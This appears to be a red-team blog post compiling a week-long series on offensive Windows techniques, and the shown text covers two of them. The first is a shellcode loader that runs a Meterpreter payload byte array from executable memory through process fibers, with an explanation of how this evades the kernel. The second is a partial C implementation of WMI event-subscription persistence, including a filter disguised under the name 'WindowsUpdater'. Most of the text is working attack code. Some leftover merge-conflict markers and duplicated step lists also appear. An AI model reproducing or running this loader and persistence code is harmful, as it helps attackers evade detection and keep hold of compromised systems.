<p><img src="../../../../../images/red.jpg" /></p>

<p>A compilation of the whole week of the 7daysofRed series all in one large blogpost.</p>

<p>=======
categories: Writeup
—</p>

<p>​         A compilation of the whole week of the 7daysofRed series all in one large blogpost.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

/***
 *    ███████╗    ██████╗  █████╗ ██╗   ██╗███████╗     ██████╗ ███████╗    ██████╗ ███████╗██████╗ 
 *    ╚════██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝    ██╔══██╗██╔════╝██╔══██╗
 *        ██╔╝    ██║  ██║███████║ ╚████╔╝ ███████╗    ██║   ██║█████╗      ██████╔╝█████╗  ██║  ██║
 *       ██╔╝     ██║  ██║██╔══██║  ╚██╔╝  ╚════██║    ██║   ██║██╔══╝      ██╔══██╗██╔══╝  ██║  ██║
 *       ██║      ██████╔╝██║  ██║   ██║   ███████║    ╚██████╔╝██║         ██║  ██║███████╗██████╔╝
 *       ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝         ╚═╝  ╚═╝╚══════╝╚═════╝ 
 *                                                                                                  
 */
          
</code></pre></div></div>
<blockquote>
  <blockquote>
    <blockquote>
      <blockquote>
        <blockquote>
          <blockquote>
            <blockquote>
              <p>63d34e1a1a2bec6a9bb93652e9e00837b3b51c07</p>
              <h2 id="day1">DAY1</h2>
              <h2 id="process-fiber-local-shellcode-execution"><strong>Process Fiber Local Shellcode Execution</strong></h2>
              <p>Local shellcode execution techniques can be used by attackers to spawn malicious code from inside a process.
Recently the Lazuras group employed this class of technique in order run code in VBA Macros undetected, more information can be found here: <a href="https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/">https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/</a>.
However in this technique we are abusing the implementation of process fibers in order to run local shellcode. 
These fibers are essentially lightweight threads that can be scheduled in user mode without the need of assistance from the kernel. Due to this, execution of a process fiber is invisible to the kernel,which makes it a interesting method for offensive purposes. In order to implement a process fiber you would have to convert your current thread into a fiber. 
Then from there you will be able to schedule sub-fibers that point to your shellcode.
Lastly you just need to switch to the shellcode fiber context in order to execute it.</p>
            </blockquote>
          </blockquote>
        </blockquote>
      </blockquote>
    </blockquote>
  </blockquote>
</blockquote>

<p>This will cause a alert due to this being a meterpreter payload for spawning a messagebox*</p>

<p>Steps:</p>

<p>«««&lt; HEAD</p>
<ul class="task-list">
  <li class="task-list-item">
    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />1<code class="highlighter-rouge">Convert Current Thread to a Fiber- ConvertThreadToFiber()</code></p>
  </li>
  <li class="task-list-item">
    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />2.<code class="highlighter-rouge">Allocate Memory in the Current Process with PAGE_EXECUTE_READWRITE permissions- VirtualAlloc()</code></p>

    <p>​      *** **<code class="highlighter-rouge">Allocating memory with PAGE_EXECUTE_READWRITE is bad opsec****</code></p>
  </li>
  <li class="task-list-item">
    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />3. <code class="highlighter-rouge">Copy shellcode into allocated memory space - CopyMemory()</code></p>
  </li>
  <li class="task-list-item">
    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />4.<code class="highlighter-rouge">Start a New fiber pointing to the allocated memory space -CreateFiber()</code></p>
  </li>
  <li>
    <h1 id="--5switch-fiber-context-to-newly-created-fiber--switchfiber">[ ] 5.<code class="highlighter-rouge">Switch Fiber Context to newly created Fiber- SwitchFiber()</code></h1>
  </li>
  <li class="task-list-item">
    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />1<code class="highlighter-rouge">Convert Current Thread to a Fiber- ##### ConvertThreadToFiber()</code></p>
  </li>
  <li class="task-list-item">
    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />2.<code class="highlighter-rouge">Allocate Memory in the Current Process with PAGE_EXECUTE_READWRITE permissions- ##### VirtualAlloc()</code></p>

    <p>​      *** **<code class="highlighter-rouge">Allocating memory with PAGE_EXECUTE_READWRITE is bad opsec****</code></p>
  </li>
  <li class="task-list-item">
    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />3. <code class="highlighter-rouge">Copy shellcode into allocated memory space - ##### CopyMemory()</code></p>
  </li>
  <li class="task-list-item">
    <p><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />4.<code class="highlighter-rouge">Start a New fiber pointing to the allocated memory space - ##### CreateFiber()</code></p>
  </li>
  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />5.<code class="highlighter-rouge">Switch Fiber Context to newly created Fiber- ##### SwitchFiber()</code>
    <blockquote>
      <blockquote>
        <blockquote>
          <blockquote>
            <blockquote>
              <blockquote>
                <blockquote>
                  <p>63d34e1a1a2bec6a9bb93652e9e00837b3b51c07</p>
                </blockquote>
              </blockquote>
            </blockquote>
          </blockquote>
        </blockquote>
      </blockquote>
    </blockquote>
  </li>
</ul>

<p>C Code for implementation:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>

<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
<span class="s">"</span><span class="se">\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x85\x08\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x53\x68\x65</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6c\x6c\x63\x6f\x64\x65\x00\x53\x75\x63\x63\x65\x73\x73\x00</span><span class="s">"</span><span class="p">;</span>

<span class="n">LPVOID</span> <span class="n">fiber</span> <span class="o">=</span> <span class="n">ConvertThreadToFiber</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
<span class="n">LPVOID</span> <span class="n">shellLoc</span><span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span><span class="n">MEM_COMMIT</span><span class="o">|</span><span class="n">MEM_RESERVE</span><span class="p">,</span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
<span class="n">CopyMemory</span><span class="p">(</span><span class="n">shellLoc</span><span class="p">,</span><span class="n">shellcode</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
<span class="n">LPVOID</span> <span class="n">shellFiber</span><span class="o">=</span> <span class="n">CreateFiber</span><span class="p">(</span><span class="mi">0</span><span class="p">,(</span><span class="n">LPFIBER_START_ROUTINE</span><span class="p">)</span><span class="n">shellLoc</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
<span class="n">SwitchToFiber</span><span class="p">(</span><span class="n">shellFiber</span><span class="p">);</span>

<span class="p">}</span>

</code></pre></div></div>
<p>Ref:</p>

<p>https://docs.microsoft.com/en-us/windows/win32/procthread/fibers</p>

<h2 id="day2">DAY2</h2>
<h2 id="wmi-permanent-event-subscription-persistence-technique">WMI Permanent Event Subscription Persistence Technique</h2>

<p>Persistence techniques are used by attackers in order to maintain access on a compromised machine in case of a loss of the inital access vector. Procedures like this are used by most APTs and are displayed throughout various attacks. In particular this technique was utilized by APT 29 in a backdoor called POSHSPY. More details can be found here:<a href="https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html"><code class="highlighter-rouge">https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html</code></a> in a writeup by FireEye. This technique using WMI Event Subscription is one that persists through reboots but requires adminstrator privileges.</p>

<p>This Persistence Technique works by abusing the WMI service COM classes. There are three revelant WMI classes that are used in this technique. They are __<strong>EventFilter</strong>,<strong>CommandLineEventConsumer</strong> and __<strong>FilterToConsumerBinding</strong>. The Logic is that by using the EventFilter class you can set a Filter instance on certain Windows Events, and when that Event occurs it triggers the CommandLineEventConsumer class’s instance which contains a command that will be executed. The last class FilterToConsumerBinding just ties both the filter instance and the consumer instance together so the event can trigger the consumer instance and execute malcious commands. In WMI selecting an event uses the WQL query language, which is a lot like SQL syntax. For example to place a filter on anytime a notepad process is created you can use, <strong><em>SELECT * From InstanceCreationEvent WITHIN 5 WHERE TARGETINSTANCE ISA “Win32_Process” AND TARGETINSTANCE.NAME=”notepad.exe”</em></strong>.
The above query translates to select all events from the __InstanceCreationEvent class within the polling interval of 5 seconds where the TargetInstance object is a Win32_Process and its name is notepad.exe.This checks if there any changes in the Win32_Process class that are named notepad.exe and returns them.You can use WQL to trigger on almost any Windows Event imaginable ranging from CD-ROMs to keyboard strokes using the CIMWin32 Provider and its numerous classes.</p>

<p>C Code: Ported into C from MDsec’s article on this topic: <a href="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/"><code class="highlighter-rouge">https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-3-wmi-event-subscription/</code></a>  (Used CommandLineEventConsumer instead of ActiveScriptEventConsumer)</p>

<p>Compile with this command: <code class="highlighter-rouge">##### gcc WmiSub.c -o Wmisub.exe -lole32 -loleaut32 -lwbemuuid</code></p>

<p>If you run this code, all it does is make a test file saying success in your C Drive, after you open notepad.exe.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _WIN32_DCOM
#include &lt;wbemidl.h&gt;
#include &lt;windows.h&gt;
#include &lt;oleauto.h&gt;
#include &lt;stdio.h&gt;
</span>
<span class="k">static</span> <span class="n">CLSID</span> <span class="n">CLSID_IWbem</span> <span class="o">=</span><span class="p">{</span><span class="mh">0x4590f811</span><span class="p">,</span> <span class="mh">0x1d3a</span><span class="p">,</span> <span class="mh">0x11d0</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span><span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x4b</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0x24</span><span class="p">};</span>
<span class="k">static</span> <span class="n">CLSID</span> <span class="n">IID_IWbem</span> <span class="o">=</span><span class="p">{</span><span class="mh">0xdc12a687</span><span class="p">,</span> <span class="mh">0x737f</span><span class="p">,</span> <span class="mh">0x11cf</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span><span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x4b</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0x24</span><span class="p">};</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">int</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>

    <span class="n">IWbemLocator</span> <span class="o">*</span><span class="n">pObject</span><span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
    <span class="n">IWbemServices</span> <span class="o">*</span><span class="n">pServices</span> <span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
    <span class="n">IWbemClassObject</span> <span class="o">*</span><span class="n">pFilter</span><span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
    <span class="n">IWbemClassObject</span> <span class="o">*</span><span class="n">pConsumer</span><span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
    <span class="n">IWbemClassObject</span> <span class="o">*</span><span class="n">pBinder</span><span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
    <span class="n">IWbemClassObject</span> <span class="o">*</span><span class="n">pBinderInstance</span><span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
    <span class="n">IWbemClassObject</span> <span class="o">*</span><span class="n">pFilterInstance</span><span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
    <span class="n">IWbemClassObject</span> <span class="o">*</span><span class="n">pConsumerInstance</span><span class="o">=</span><span class="nb">NULL</span><span class="p">;</span>
    <span class="n">BSTR</span> <span class="n">resource</span> <span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"ROOT</span><span class="se">\\</span><span class="s">SUBSCRIPTION"</span><span class="p">);</span>
    <span class="n">BSTR</span> <span class="n">consumerclass</span><span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"CommandLineEventConsumer"</span><span class="p">);</span>
    <span class="n">BSTR</span> <span class="n">filterclass</span> <span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"__EventFilter"</span><span class="p">);</span>
    <span class="n">BSTR</span> <span class="n">binderclass</span><span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"__FilterToConsumerBinding"</span><span class="p">);</span>
    <span class="n">HRESULT</span> <span class="n">hres</span><span class="p">;</span>
    <span class="c1">//1.Initialize COM</span>
    <span class="n">hres</span><span class="o">=</span><span class="n">CoInitializeEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">COINIT_MULTITHREADED</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">)){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"COM was not successfully initialized</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"COM was initialized</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">//2.Initialize COM Security</span>
    <span class="n">hres</span><span class="o">=</span><span class="n">CoInitializeSecurity</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">RPC_C_AUTHN_LEVEL_DEFAULT</span><span class="p">,</span><span class="n">RPC_C_IMP_LEVEL_IMPERSONATE</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">EOAC_NONE</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">)){</span>
         <span class="n">printf</span><span class="p">(</span><span class="s">"COM Security was not properly initialized</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
         <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
   <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"COM Security was initialized</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
   <span class="p">}</span>

   <span class="c1">//3.Initialize IWbemLocator</span>
   <span class="n">hres</span><span class="o">=</span><span class="n">CoCreateInstance</span><span class="p">(</span><span class="o">&amp;</span><span class="n">CLSID_IWbem</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">CLSCTX_INPROC_SERVER</span><span class="p">,</span><span class="o">&amp;</span><span class="n">IID_IWbem</span><span class="p">,(</span><span class="n">LPVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pObject</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">)){</span>
       <span class="n">printf</span><span class="p">(</span><span class="s">"IWbemLocator Object was not properly initialized</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
       <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>

  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"IWbemLocator was initialized</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span>


  <span class="c1">//4.Connect to WMI and get pointer to IWbemServices</span>
  <span class="n">hres</span><span class="o">=</span><span class="n">pObject</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">ConnectServer</span><span class="p">(</span><span class="n">pObject</span><span class="p">,</span><span class="n">resource</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pServices</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">)){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"IWbemServices pointer was not properly attained "</span><span class="p">);</span>
    <span class="n">pObject</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">(</span><span class="n">pObject</span><span class="p">);</span>
  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"IWbemServices pointer was attained "</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="c1">//5.Set Security Attributes on the IWbemServices proxy so it can impersonate the client</span>
  <span class="n">hres</span><span class="o">=</span><span class="n">CoSetProxyBlanket</span><span class="p">(</span><span class="n">pServices</span><span class="p">,</span> <span class="n">RPC_C_AUTHN_WINNT</span><span class="p">,</span> <span class="n">RPC_C_AUTHZ_NONE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">RPC_C_AUTHN_LEVEL_CALL</span><span class="p">,</span> <span class="n">RPC_C_IMP_LEVEL_IMPERSONATE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">EOAC_NONE</span><span class="p">);</span>
   <span class="k">if</span><span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">)){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Proxy Security settings not set"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"1%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">GetLastError</span><span class="p">());</span>
    <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
   <span class="p">}</span><span class="k">else</span><span class="p">{</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"Proxy Security settings set"</span><span class="p">);</span>
   <span class="p">}</span>
    <span class="c1">// 6.Attain WMI FILTER CLASS</span>
    <span class="n">hres</span><span class="o">=</span><span class="n">pServices</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">GetObject</span><span class="p">(</span><span class="n">pServices</span><span class="p">,</span><span class="n">filterclass</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pFilter</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">)){</span>
       <span class="n">printf</span><span class="p">(</span><span class="s">"Filter class was not properly retrieved"</span><span class="p">);</span>
       <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
       <span class="n">printf</span><span class="p">(</span><span class="s">"Filter class was properly retrieved</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">//7.Spawn an Instance of Filter Class</span>
    <span class="n">hres</span><span class="o">=</span><span class="n">pFilter</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">SpawnInstance</span><span class="p">(</span><span class="n">pFilter</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pFilterInstance</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">)){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Filter class instance wasn't properly spawned</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Filter class instance was properly spawned</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">//8.Setting __EventFilter Class Name Field</span>
    <span class="n">VARIANT</span> <span class="n">v</span><span class="p">;</span>
    <span class="n">VariantInit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">);</span>
    <span class="n">V_VT</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">VT_BSTR</span><span class="p">;</span>
    <span class="n">V_BSTR</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"WindowsUpdater"</span><span class="p">);</span>

    <span class="n">BSTR</span> <span class="n">Name</span><span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"Name"</span><span class="p">);</span>
    <span class="n">pFilterInstance</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Put</span><span class="p">(</span><span class="n">pFilterInstance</span><span class="p">,</span><span class="n">Name</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">v</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">VariantClear</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">);</span>

    <span class="c1">//9.Setting __EventFilter Class Query Field</span>
    <span class="n">V_VT</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">VT_BSTR</span><span class="p">;</span>
    <span class="n">V_BSTR</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"Select * From __InstanceCreationEvent Within 5 Where TargetInstance Isa </span><span class="se">\"</span><span class="s">Win32_Process</span><span class="se">\"</span><span class="s"> And TargetInstance.Name = </span><span class="se">\"</span><span class="s">notepad.exe</span><span class="se">\"</span><span class="s">"</span><span class="p">);</span>

    <span class="n">BSTR</span> <span class="n">Query</span> <span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"Query"</span><span class="p">);</span>
    <span class="n">pFilterInstance</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Put</span><span class="p">(</span><span class="n">pFilterInstance</span><span class="p">,</span><span class="n">Query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">v</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">VariantClear</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">);</span>


    <span class="c1">//10.Setting __EventFilter Class QueryLanguage Field</span>
    <span class="n">V_VT</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">VT_BSTR</span><span class="p">;</span>
    <span class="n">V_BSTR</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"WQL"</span><span class="p">);</span>

    <span class="n">BSTR</span> <span class="n">QueryLanguage</span> <span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"QueryLanguage"</span><span class="p">);</span>
    <span class="n">pFilterInstance</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Put</span><span class="p">(</span><span class="n">pFilterInstance</span><span class="p">,</span><span class="n">QueryLanguage</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">v</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">VariantClear</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">);</span>

    <span class="c1">//11.Setting __EventFilter Class EventNameSpace Field</span>
    <span class="n">VariantInit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">);</span>
    <span class="n">V_VT</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">VT_BSTR</span><span class="p">;</span>
    <span class="n">V_BSTR</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">)</span><span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"root</span><span class="se">\\</span><span class="s">cimv2"</span><span class="p">);</span>

    <span class="n">BSTR</span> <span class="n">EventNameSpace</span> <span class="o">=</span><span class="n">SysAllocString</span><span class="p">(</span><span class="s">L"EventNameSpace"</span><span class="p">);</span>
    <span class="n">pFilterInstance</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">Put</span><span class="p">(</span><span class="n">pFilterInstance</span><span class="p">,</span><span class="n">EventNameSpace</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">v</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">VariantClear</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v</span><span class="p">);</span>

    <span class="n">hres</span><span class="o">=</span><span class="n">pServices</span><span class="o">-&gt;</span><span class="n">lpVtbl</span><span class="o">-&gt;</span><span class="n">PutInstance</span><span class="p">(</span><span class="n">pServices</span><span class="p">,</span><span class="n">pFilterInstance</span><span class="p">,</span><span class="n">WBEM_FLAG_CREATE_OR_UPDATE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">)){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Modified Event Filter Class Instance was unable to be written</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Event Filter class instance was properly written</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="p">}</span>


    <span class="c1">//12.Getting CommandLineEventConsumer Class</span>
